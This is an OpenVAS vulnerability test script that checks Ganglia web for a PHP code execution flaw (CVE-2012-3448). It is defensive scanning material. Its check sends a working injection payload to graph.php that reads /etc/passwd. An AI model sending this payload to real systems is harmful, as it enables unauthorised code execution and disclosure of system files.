###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ganglia_54699.nasl 5931 2017-04-11 09:02:04Z teissa $
#
# Ganglia PHP Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Ganglia is prone to a vulnerability that lets remote attackers execute
arbitrary code.

Attackers can exploit this issue to execute arbitrary PHP code within
the context of the affected web server process.";

tag_solution = "Vendor updates are available. Please see the references for more
information.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103535";
CPE = "cpe:/a:ganglia:ganglia-web";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(54699);
 script_cve_id("CVE-2012-3448");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_version ("$Revision: 5931 $");

 script_name("Ganglia PHP Code Execution Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/54699");
 script_xref(name : "URL" , value : "http://ganglia.sourceforge.net/");
 script_xref(name : "URL" , value : "http://console-cowboys.blogspot.de/2012/07/extending-your-ganglia-install-with.html");

 script_tag(name:"last_modification", value:"$Date: 2017-04-11 11:02:04 +0200 (Tue, 11 Apr 2017) $");
 script_tag(name:"creation_date", value:"2012-08-13 12:40:50 +0200 (Mon, 13 Aug 2012)");
 script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("gb_ganglia_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
if(!get_port_state(port))exit(0);

if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

url = dir + '/graph.php?g=cpu_report,include+%27/etc/passwd%27'; 

if(http_vuln_check(port:port, url:url,pattern:"root:x:0:[01]:.*")) {
     
  security_message(port:port);
  exit(0);

}

exit(0);

